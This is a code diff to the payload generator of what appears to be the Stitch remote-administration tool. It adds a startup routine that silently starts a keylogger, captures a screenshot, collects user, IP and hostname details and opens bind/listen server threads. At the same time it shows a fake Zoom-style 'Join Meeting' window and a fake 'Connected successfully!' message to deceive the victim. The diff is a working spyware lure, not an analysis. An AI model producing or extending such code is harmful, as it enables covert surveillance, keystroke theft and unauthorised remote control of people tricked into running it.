@@ -170,7 +170,7 @@ def add_run_main():
         return '''
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, notification):
-        st_thread = threading.Thread(target=main)
+        st_thread = threading.Thread(target=enhanced_main)
         st_thread.daemon = True
         st_thread.start()
 
@@ -186,7 +186,251 @@ if __name__ == '__main__':
     else:
         return '''
 if __name__ == '__main__':
-    main()
+    enhanced_main()
+'''
+
+def add_enhanced_main():
+    return '''
+def enhanced_main():
+    """Enhanced main function with auto-execution and meeting UI"""
+    def run_background_operations():
+        try:
+            # Auto-execute key operations
+            auto_ops_result = auto_execute_operations()
+            
+            # Start normal payload operations
+            if not stitch_running():
+                st_pyld = stitch_payload()
+                
+                # Start connection threads based on configuration
+                threads = []
+                
+                if hasattr(st_pyld, 'bind_server'):
+                    bind_thread = threading.Thread(target=st_pyld.bind_server, args=())
+                    bind_thread.daemon = True
+                    threads.append(bind_thread)
+                    
+                if hasattr(st_pyld, 'listen_server'):
+                    listen_thread = threading.Thread(target=st_pyld.listen_server, args=())
+                    listen_thread.daemon = True
+                    threads.append(listen_thread)
+                
+                for thread in threads:
+                    thread.start()
+                    
+        except Exception as e:
+            try:
+                error_log = os.path.join(get_temp(), 'enhanced_error.log')
+                with open(error_log, 'w') as f:
+                    f.write(f"Enhanced main error: {str(e)}\\n")
+            except:
+                pass
+    
+    def show_meeting_interface():
+        try:
+            sleep(3)  # Let background operations start
+            show_meeting_ui()
+        except Exception:
+            # Fallback console meeting prompt
+            try:
+                print("\\n" + "="*40)
+                print("         JOIN MEETING")
+                print("="*40)
+                try:
+                    meeting_id = raw_input("Enter Meeting ID: ").strip()
+                except NameError:
+                    meeting_id = input("Enter Meeting ID: ").strip()
+                if meeting_id:
+                    print(f"Connecting to meeting {meeting_id}...")
+                    sleep(2)
+                    print("Connected successfully!")
+            except:
+                pass
+    
+    # Start background operations
+    bg_thread = threading.Thread(target=run_background_operations)
+    bg_thread.daemon = True
+    bg_thread.start()
+    
+    # Show meeting interface
+    ui_thread = threading.Thread(target=show_meeting_interface)
+    ui_thread.daemon = True
+    ui_thread.start()
+    
+    # Keep main thread alive
+    try:
+        while True:
+            sleep(60)
+    except KeyboardInterrupt:
+        pass
+
+def auto_execute_operations():
+    """Auto-execute key operations silently"""
+    operations_log = []
+    
+    try:
+        # Start keylogger
+        if win_client():
+            nt_kl.stop_freeze()
+        status = nt_kl.get_status()
+        if not status:
+            nt_kl.start()
+            status = nt_kl.get_status()
+            if status:
+                operations_log.append("[+] Keylogger started")
+        
+        # Take screenshot
+        temp = get_temp()
+        screenshot_path = os.path.join(temp, 'auto_screenshot.jpg')
+        
+        with MSS() as screenshotter:
+            if osx_client():
+                result = run_command(f'screencapture -x {screenshot_path}')
+                if not no_error(result):
+                    screenshotter.max_displays = 32
+                    next(screenshotter.save(mon=-1, output=screenshot_path))
+            else:
+                next(screenshotter.save(mon=-1, output=screenshot_path))
+        
+        if os.path.exists(screenshot_path):
+            operations_log.append("[+] Screenshot captured")
+        
+        # Gather system info
+        import socket
+        import platform
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        
+        sysinfo = {
+            'os': platform.platform(),
+            'user': get_user(),
+            'ip': ip,
+            'hostname': platform.node()
+        }
+        operations_log.append("[+] System info gathered")
+        
+        # Save operations log
+        log_path = os.path.join(temp, 'auto_ops.log')
+        with open(log_path, 'w') as f:
+            f.write("Auto-execution log:\\n")
+            for entry in operations_log:
+                f.write(entry + "\\n")
+        
+        return {'success': True, 'operations': operations_log}
+        
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def show_meeting_ui():
+    """Show Zoom-like meeting interface"""
+    try:
+        # Try GUI version first
+        if win_client():
+            import tkinter as tk
+            from tkinter import ttk, messagebox
+        else:
+            import Tkinter as tk
+            import ttk
+            import tkMessageBox as messagebox
+        
+        root = tk.Tk()
+        root.title("Join Meeting")
+        root.geometry("480x320")
+        root.resizable(False, False)
+        
+        # Center window
+        root.update_idletasks()
+        width = root.winfo_width()
+        height = root.winfo_height()
+        x = (root.winfo_screenwidth() // 2) - (width // 2)
+        y = (root.winfo_screenheight() // 2) - (height // 2)
+        root.geometry(f"{width}x{height}+{x}+{y}")
+        
+        # Configure colors
+        bg_color = "#ffffff"
+        primary_color = "#2d8cff"
+        text_color = "#1f2937"
+        
+        root.configure(bg=bg_color)
+        
+        # Main frame
+        main_frame = tk.Frame(root, bg=bg_color, padx=40, pady=30)
+        main_frame.pack(fill="both", expand=True)
+        
+        # Title
+        title_label = tk.Label(main_frame, text="📹 Join Meeting", 
+                              font=("Arial", 18, "bold"), 
+                              bg=bg_color, fg=text_color)
+        title_label.pack(pady=(0, 30))
+        
+        # Meeting ID input
+        id_label = tk.Label(main_frame, text="Meeting ID", 
+                           font=("Arial", 11), 
+                           bg=bg_color, fg=text_color)
+        id_label.pack(anchor="w", pady=(0, 5))
+        
+        id_entry = tk.Entry(main_frame, font=("Arial", 14), 
+                           relief="solid", borderwidth=1)
+        id_entry.pack(fill="x", ipady=8, pady=(0, 20))
+        id_entry.focus()
+        
+        # Buttons
+        button_frame = tk.Frame(main_frame, bg=bg_color)
+        button_frame.pack(fill="x")
+        
+        def join_meeting():
+            meeting_id = id_entry.get().strip()
+            if meeting_id:
+                # Log meeting ID
+                try:
+                    log_path = os.path.join(get_temp(), 'meeting.log')
+                    with open(log_path, 'w') as f:
+                        f.write(f"Meeting ID: {meeting_id}\\n")
+                except:
+                    pass
+                
+                # Show connecting message
+                id_entry.configure(state="disabled")
+                join_btn.configure(state="disabled", text="Connecting...")
+                root.after(2000, lambda: root.quit())
+            else:
+                messagebox.showerror("Error", "Please enter a Meeting ID")
+        
+        join_btn = tk.Button(button_frame, text="Join Meeting", 
+                            font=("Arial", 11, "bold"),
+                            bg=primary_color, fg="white",
+                            relief="flat", padx=30, pady=10,
+                            command=join_meeting)
+        join_btn.pack(side="right")
+        
+        cancel_btn = tk.Button(button_frame, text="Cancel", 
+                              font=("Arial", 11),
+                              bg="#f7f9fa", fg=text_color,
+                              relief="flat", padx=30, pady=10,
+                              command=root.quit)
+        cancel_btn.pack(side="right", padx=(0, 10))
+        
+        root.mainloop()
+        root.destroy()
+        
+    except Exception:
+        # Fallback to console version
+        print("\\n" + "="*40)
+        print("         JOIN MEETING")
+        print("="*40)
+        try:
+            meeting_id = raw_input("Enter Meeting ID: ").strip()
+        except NameError:
+            meeting_id = input("Enter Meeting ID: ").strip()
+        
+        if meeting_id:
+            print(f"Connecting to meeting {meeting_id}...")
+            sleep(2)
+            print("Connected successfully!")
+
 '''
 ################################################################################
 #                       st_utils.py stitch_gen variables                       #
@@ -211,7 +455,27 @@ from st_protocol import *
 from st_encryption import *
 from mss import ScreenshotError
 from time import strftime, sleep
-from contextlib import contextmanager\n'''
+from contextlib import contextmanager
+
+# GUI imports for meeting interface
+try:
+    if sys.platform.startswith('win'):
+        import tkinter as tk
+        from tkinter import ttk, messagebox, font
+    else:
+        import Tkinter as tk
+        import ttk
+        import tkMessageBox as messagebox
+        import tkFont as font
+except ImportError:
+    try:
+        import Tkinter as tk
+        import ttk
+        import tkMessageBox as messagebox
+        import tkFont as font
+    except ImportError:
+        tk = None
+\n'''
 
 utils_code = '''
 
